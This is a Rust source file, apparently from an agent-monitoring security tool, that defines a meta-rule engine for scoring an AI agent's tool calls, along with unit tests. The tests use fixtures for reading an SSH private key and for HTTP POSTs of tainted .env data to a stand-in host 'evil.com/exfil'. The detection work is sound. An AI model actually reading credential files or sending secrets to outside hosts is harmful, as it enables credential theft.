// SPDX-License-Identifier: MPL-2.0
// Copyright (c) grith contributors

//! Composite meta-rules that fire on specific filter result combinations.

use crate::types::{FilterResult, ToolCallContext, ToolCallType};
use serde::Deserialize;

/// A composite meta-rule that fires when specific filter combinations match.
#[derive(Debug, Clone, Deserialize)]
pub struct MetaRule {
    pub id: String,
    pub conditions: Vec<MetaCondition>,
    #[serde(default)]
    pub score_override: Option<f64>,
    #[serde(default)]
    pub score_adjustment: Option<f64>,
    pub message: String,
}

/// A condition that must be met for a meta-rule to fire.
#[derive(Debug, Clone, Deserialize)]
pub struct MetaCondition {
    pub filter: Option<String>,
    pub rule_id: Option<String>,
    pub matched: Option<bool>,
    pub call_type: Option<String>,
    pub path_contains: Option<String>,
    pub taint_source: Option<String>,
}

/// Engine that evaluates meta-rules against filter results.
pub struct MetaRuleEngine {
    rules: Vec<MetaRule>,
}

impl MetaRuleEngine {
    pub fn new(rules: Vec<MetaRule>) -> Self {
        Self { rules }
    }

    /// Evaluate all meta-rules and return the total score adjustment.
    pub fn evaluate(&self, results: &[FilterResult], ctx: &ToolCallContext) -> f64 {
        let mut adjustment = 0.0;
        for rule in &self.rules {
            if self.matches_all_conditions(rule, results, ctx) {
                if let Some(override_score) = rule.score_override {
                    // Score override replaces the current score — we return it
                    // as a large adjustment that effectively sets the score.
                    // The caller should handle this specially if needed.
                    // For now, return it as a positive adjustment from 0.
                    tracing::debug!(rule = %rule.id, score = override_score, "meta-rule override");
                    return override_score - crate::scoring::aggregate(results);
                }
                if let Some(adj) = rule.score_adjustment {
                    tracing::debug!(rule = %rule.id, adjustment = adj, "meta-rule adjustment");
                    adjustment += adj;
                }
            }
        }
        adjustment
    }

    fn matches_all_conditions(
        &self,
        rule: &MetaRule,
        results: &[FilterResult],
        ctx: &ToolCallContext,
    ) -> bool {
        rule.conditions
            .iter()
            .all(|c| self.matches_condition(c, results, ctx))
    }

    fn matches_condition(
        &self,
        condition: &MetaCondition,
        results: &[FilterResult],
        ctx: &ToolCallContext,
    ) -> bool {
        // Check filter-based conditions
        if let Some(filter_name) = &condition.filter {
            let filter_match = results.iter().any(|r| {
                let name_matches = r.filter_name == *filter_name;
                let rule_matches = condition
                    .rule_id
                    .as_ref()
                    .is_none_or(|rid| r.rule_id == *rid);
                let matched_matches = condition.matched.is_none_or(|m| r.matched == m);
                name_matches && rule_matches && matched_matches
            });
            if !filter_match {
                return false;
            }
        }

        // Check call_type condition
        if let Some(expected_type) = &condition.call_type {
            let actual_type = match &ctx.call_type {
                ToolCallType::FileRead { .. } => "FileRead",
                ToolCallType::FileWrite { .. } => "FileWrite",
                ToolCallType::FileAppend { .. } => "FileAppend",
                ToolCallType::FileDelete { .. } => "FileDelete",
                ToolCallType::DirList { .. } => "DirList",
                ToolCallType::ShellExec { .. } => "ShellExec",
                ToolCallType::HttpRequest { .. } => "HttpRequest",
                ToolCallType::FileRename { .. } => "FileRename",
                ToolCallType::FileChmod { .. } => "FileChmod",
                ToolCallType::DirCreate { .. } => "DirCreate",
                ToolCallType::NetConnect { .. } => "NetConnect",
                ToolCallType::NetListen { .. } => "NetListen",
                ToolCallType::ProcessSpawn { .. } => "ProcessSpawn",
                ToolCallType::DnsQuery { .. } => "DnsQuery",
            };
            if actual_type != expected_type {
                return false;
            }
        }

        // Check path_contains condition
        if let Some(substring) = &condition.path_contains {
            if let Some(path) = ctx.path() {
                if !path.contains(substring.as_str()) {
                    return false;
                }
            } else {
                return false;
            }
        }

        // Taint source condition: check filter result metadata from the taint
        // filter for the expected source category.
        if let Some(expected) = &condition.taint_source {
            let taint_matched = results
                .iter()
                .filter(|r| r.filter_name == "taint")
                .any(|r| {
                    // Check active_taint_sources array (set on sink evaluations)
                    if let Some(sources) = r.metadata.get("active_taint_sources") {
                        if let Some(arr) = sources.as_array() {
                            if arr.iter().any(|v| v.as_str() == Some(expected)) {
                                return true;
                            }
                        }
                    }
                    // Check taint_source_category (set on source registration)
                    if let Some(cat) = r.metadata.get("taint_source_category") {
                        if cat.as_str() == Some(expected) {
                            return true;
                        }
                    }
                    false
                });
            if !taint_matched {
                return false;
            }
        }

        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::types::*;
    use uuid::Uuid;

    fn make_ctx(call_type: ToolCallType) -> ToolCallContext {
        ToolCallContext::new("test", call_type, Uuid::new_v4())
    }

    #[test]
    fn test_no_rules_no_adjustment() {
        let engine = MetaRuleEngine::new(vec![]);
        let results = vec![FilterResult::matched(
            "path_match",
            "ssh-private-key",
            5.0,
            Severity::Critical,
            "SSH key",
        )];
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "~/.ssh/id_rsa".into(),
        });
        assert_eq!(engine.evaluate(&results, &ctx), 0.0);
    }

    #[test]
    fn test_score_adjustment_fires() {
        let engine = MetaRuleEngine::new(vec![MetaRule {
            id: "npm-dependency-resolution".into(),
            conditions: vec![
                MetaCondition {
                    filter: Some("path_match".into()),
                    rule_id: Some("package-json".into()),
                    matched: Some(true),
                    call_type: None,
                    path_contains: None,
                    taint_source: None,
                },
                MetaCondition {
                    filter: None,
                    rule_id: None,
                    matched: None,
                    call_type: Some("DirList".into()),
                    path_contains: Some("node_modules".into()),
                    taint_source: None,
                },
            ],
            score_override: None,
            score_adjustment: Some(-3.0),
            message: "Routine NPM dependency resolution".into(),
        }]);

        let results = vec![FilterResult::matched(
            "path_match",
            "package-json",
            2.0,
            Severity::Notice,
            "package.json access",
        )];
        let ctx = make_ctx(ToolCallType::DirList {
            path: "/project/node_modules".into(),
        });

        assert_eq!(engine.evaluate(&results, &ctx), -3.0);
    }

    #[test]
    fn test_score_override_fires() {
        let engine = MetaRuleEngine::new(vec![MetaRule {
            id: "ssh-key-access".into(),
            conditions: vec![MetaCondition {
                filter: Some("path_match".into()),
                rule_id: Some("ssh-private-key".into()),
                matched: Some(true),
                call_type: None,
                path_contains: None,
                taint_source: None,
            }],
            score_override: Some(8.0),
            score_adjustment: None,
            message: "Direct SSH private key access".into(),
        }]);

        let results = vec![FilterResult::matched(
            "path_match",
            "ssh-private-key",
            5.0,
            Severity::Critical,
            "SSH key",
        )];
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "~/.ssh/id_rsa".into(),
        });

        // Override should adjust from 5.0 to 8.0, so adjustment = 3.0
        let adj = engine.evaluate(&results, &ctx);
        assert_eq!(adj, 3.0);
    }

    #[test]
    fn test_condition_not_met() {
        let engine = MetaRuleEngine::new(vec![MetaRule {
            id: "test".into(),
            conditions: vec![MetaCondition {
                filter: Some("path_match".into()),
                rule_id: Some("nonexistent".into()),
                matched: Some(true),
                call_type: None,
                path_contains: None,
                taint_source: None,
            }],
            score_override: None,
            score_adjustment: Some(5.0),
            message: "should not fire".into(),
        }]);

        let results = vec![FilterResult::matched(
            "path_match",
            "ssh-private-key",
            5.0,
            Severity::Critical,
            "SSH key",
        )];
        let ctx = make_ctx(ToolCallType::FileRead {
            path: "~/.ssh/id_rsa".into(),
        });

        assert_eq!(engine.evaluate(&results, &ctx), 0.0);
    }

    #[test]
    fn test_http_request_condition() {
        let engine = MetaRuleEngine::new(vec![MetaRule {
            id: "env-exfiltration".into(),
            conditions: vec![MetaCondition {
                filter: None,
                rule_id: None,
                matched: None,
                call_type: Some("HttpRequest".into()),
                path_contains: None,
                taint_source: None,
            }],
            score_override: None,
            score_adjustment: Some(2.0),
            message: "HTTP after sensitive read".into(),
        }]);

        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.com".into(),
        });

        assert_eq!(engine.evaluate(&[], &ctx), 2.0);
    }

    fn make_taint_exfil_engine() -> MetaRuleEngine {
        MetaRuleEngine::new(vec![MetaRule {
            id: "tainted-exfil".into(),
            conditions: vec![MetaCondition {
                filter: None,
                rule_id: None,
                matched: None,
                call_type: Some("HttpRequest".into()),
                path_contains: None,
                taint_source: Some("env-file".into()),
            }],
            score_override: None,
            score_adjustment: Some(5.0),
            message: "Tainted data exfiltration".into(),
        }])
    }

    #[test]
    fn test_taint_source_matches_with_active_taint_sources() {
        let engine = make_taint_exfil_engine();

        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.com/exfil".into(),
        });

        let mut result = FilterResult::matched(
            "taint",
            "medium-taint-high-risk-sink",
            4.0,
            Severity::Error,
            "Tainted data flowing to high-risk HTTP sink",
        );
        result.metadata.insert(
            "active_taint_sources".into(),
            serde_json::json!(["env-file"]),
        );

        assert_eq!(engine.evaluate(&[result], &ctx), 5.0);
    }

    #[test]
    fn test_taint_source_matches_with_taint_source_category() {
        let engine = make_taint_exfil_engine();

        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.com/exfil".into(),
        });

        let mut result = FilterResult::no_match("taint");
        result.metadata.insert(
            "taint_source_category".into(),
            serde_json::json!("env-file"),
        );

        assert_eq!(engine.evaluate(&[result], &ctx), 5.0);
    }

    #[test]
    fn test_taint_source_does_not_match_wrong_category() {
        let engine = make_taint_exfil_engine();

        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.com/exfil".into(),
        });

        let mut result = FilterResult::matched(
            "taint",
            "high-taint-network-sink",
            5.0,
            Severity::Critical,
            "Highly tainted data",
        );
        result.metadata.insert(
            "active_taint_sources".into(),
            serde_json::json!(["ssh-key"]),
        );

        // "env-file" expected but only "ssh-key" present
        assert_eq!(engine.evaluate(&[result], &ctx), 0.0);
    }

    #[test]
    fn test_taint_source_does_not_match_without_taint_results() {
        let engine = make_taint_exfil_engine();

        let ctx = make_ctx(ToolCallType::HttpRequest {
            method: "POST".into(),
            url: "https://evil.com/exfil".into(),
        });

        // No taint filter results at all
        assert_eq!(engine.evaluate(&[], &ctx), 0.0);
    }
}
